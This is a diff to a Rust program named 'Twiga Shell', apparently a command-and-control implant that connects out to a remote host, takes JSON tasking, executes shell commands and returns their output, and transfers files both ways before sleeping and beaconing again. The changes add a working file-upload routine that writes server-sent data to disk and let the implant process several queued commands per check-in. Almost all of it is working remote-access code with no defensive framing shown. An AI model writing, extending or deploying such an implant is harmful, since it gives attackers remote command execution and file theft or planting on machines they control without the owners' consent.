@@ -19,14 +19,12 @@ const ID:u32 = 1001;
 const BUFFSIZE:usize = 1024;
 
 /* Twiga Shell
-      - Put file - TODO
+      - Put file - Uploads file from local to remote
       - Get file - Downloads file from remote machine
       - Execute Commands - Executes command and returns stdout, stderr and status code
 
-
-    Data Structures:
-          [ ID | CMD | P_LEN | P | ... ]
 */
+
 #[derive(RustcEncodable, RustcDecodable)]
 struct CommandExecutionResult {
     stdout: String,
@@ -60,8 +58,8 @@ fn connect_message() -> String{
     return json::encode(&connect_data).unwrap();
 }
 
-fn parse_tasking(message: &str) -> CommTask {
-    let output: CommTask = json::decode(message).expect("Data is not JSON");
+fn parse_tasking(message: &str) -> Vec<CommTask> {
+    let output: Vec<CommTask> = json::decode(message).expect("Data is not JSON");
     return output;
 }
 
@@ -92,7 +90,7 @@ fn get_file(command: &str, stream: &mut TcpStream) -> String {
     let mut read_bytes = BUFFSIZE;
     let mut total_bytes = 0;
     while read_bytes == BUFFSIZE {
-        // Create a zeroize a buffer per read
+        // Create a zeroized buffer per read
         let mut file_buffer:[u8; BUFFSIZE] = [0; BUFFSIZE];
         read_bytes = match f.read(&mut file_buffer) {
             Ok(bytes) => bytes,
@@ -110,9 +108,44 @@ fn get_file(command: &str, stream: &mut TcpStream) -> String {
     return format_args!("File Transfered, sent {} bytes", total_bytes).to_string();
 }
 
-fn put_file(command: &str) -> String {
-    let _ = command.len();
-    return String::from("Unimplemented");
+fn put_file(command: &str, stream: &mut TcpStream) -> String {
+    /* Retrieve file from remote host.
+            -- Raw string from the tasking
+            -- TCP stream connecting to the server
+    */
+    let split = command.split(" ");
+    // First part of string is the command
+    let mut args = vec![];
+    for arg in split {
+       args.push(arg.to_string());
+    }
+    if args.len() < 1 {
+        return String::from("Missing Parameters");
+    } else if args.len() > 1 {
+        return String::from("Too many parameters");
+    }
+    let l_path = Path::new(&args[0]);
+    let mut f = match File::create(l_path, ) {
+        Ok(f) => f,
+        Err(_) => return String::from("File did not open for write")
+    };
+    let mut read_bytes = BUFFSIZE;
+    let mut total_bytes = 0;
+    while read_bytes == BUFFSIZE {
+        // Create a zeroize a buffer per read
+        let mut file_buffer:[u8; BUFFSIZE] = [0; BUFFSIZE];
+        read_bytes = match stream.read(&mut file_buffer) {
+            Ok(bytes) => bytes,
+            Err(_) => return String::from("Could not read from TcpStream")
+        };
+        let (data, _) = file_buffer.split_at(read_bytes);
+        let written_bytes:usize = match f.write(&data) {
+            Ok(bytes) => bytes,
+            Err(_) => return String::from("Could not write file")
+        };
+        total_bytes += written_bytes;
+    }
+    return format_args!("File Transfered, wrote {} bytes to {:?}", total_bytes, l_path).to_string();
 }
 
 fn execute_command(command: &str) -> String {
@@ -176,30 +209,36 @@ fn main() {
         // Send Connect Message
         let message = connect_message();
         send_message(&mut stream, message);
+        println!("Sent Connect Message to {}", HOST);
 
         let message = recv_message(&mut stream);
-        let task = parse_tasking(&message);
+        println!("Received Task Message from {}", HOST);
+        let tasks: Vec<CommTask> = parse_tasking(&message);
         // Execute the tasking
-        let output:String;
-        if task.id == ID {
-            output = match task.cmd {
-                1000 => execute_command(&task.parameters),
-                1001 => get_file(&task.parameters, &mut stream),
-                1002 => put_file(&task.parameters),
-                _    => String::from("Unknown Command number")
+        for task in tasks {
+            let output:String;
+            if task.id == ID {
+                output = match task.cmd {
+                    1000 => execute_command(&task.parameters),
+                    1001 => get_file(&task.parameters, &mut stream),
+                    1002 => put_file(&task.parameters, &mut stream),
+                    _    => String::from("Unknown Command number")
+                };
+            } else {
+                output = fmt::format(format_args!("Queued command for {}", task.id));
+                // Not really queuing here, but sometime in the future
+            }
+            // Create the return Struct to relay status
+            let command_output = CommResult {
+                cmd: task.cmd,
+                id: 1001u32,
+                output: output
             };
-        } else {
-            output = fmt::format(format_args!("Queued command for {}", task.id));
+            let output = json::encode(&command_output).unwrap();
+            println!("{} {}\n",output.len(), output);
+            let _ = stream.write_fmt(format_args!("{}\n",output));
+            println!("Sent Task Response to {}", HOST);
         }
-        // Create the return Struct
-        let command_output = CommResult {
-            cmd: task.cmd,
-            id: 1001u32,
-            output: output
-        };
-        let output = json::encode(&command_output).unwrap();
-        println!("{} {}\n",output.len(), output);
-        let _ = stream.write_fmt(format_args!("{}\n",output));
 
         let _ = stream.shutdown(Shutdown::Both).map_err(|err| panic!(err.to_string()));
         thread::sleep(Duration::new(SLEEP_SECONDS, 0));
